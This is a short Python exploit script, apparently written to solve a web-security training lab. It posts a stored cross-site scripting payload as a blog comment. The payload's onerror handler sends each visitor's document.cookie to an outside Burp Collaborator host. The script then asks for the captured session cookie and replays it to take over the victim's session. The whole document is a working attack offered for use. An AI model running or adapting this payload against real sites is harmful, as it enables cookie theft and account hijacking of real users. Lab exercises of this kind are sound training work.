import requests
import urllib3
from sys import argv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_urls():
    if len(argv) != 5:
        print(f"[+] usage {argv[0]} <url> <burpcollaborator> <csrf> <session>")
        print(f"[+] example {argv[0]} 'http://example.com' 'udbhe7ybkgm440pijy8bkhs2dtjj78.oastify.com' 'BWyN0dGCrWgHVL0Pp4EoZTXGAgKFRbT9' 'S5FqpElto2doUXJvlDSSEeTPYrwQxKgx'")
        exit(-1)

    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]
    burpC = argv[2]
    csrf = argv[3]
    session = argv[4]
    return url, burpC, csrf, session

def attack(): 
    print("[+] Starting attack")
    url, burpC, csrf, session = get_website_urls()
    posts_path = "/post/comment"  
    xss_payload = f"<img src=x onerror=this.src='http://{burpC}/?'+document.cookie;>"

    print(f"[+] sending xss payload : {xss_payload}")
    params = {
        "csrf"   : csrf,
        "postId" : "2",
        "comment": xss_payload,
        "name"   : "attacker",
        "email"  : "attacker@attack.com",
        "website": ""
        }

    cookie = {"session": session}

    r = requests.post(url + posts_path, data=params, cookies=cookie)

    new_session = input("Please Enter session that sent to your burp collaborator : ")
    
    cookie = {"session": new_session}
    r = requests.get(url, cookies=cookie)

    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        r = requests.get(url, cookies=cookie)
        if 'Congratulations' in r.text:
            print("[+] attack successfully")
        else:
            print("[-] Attack un successfully")

attack()
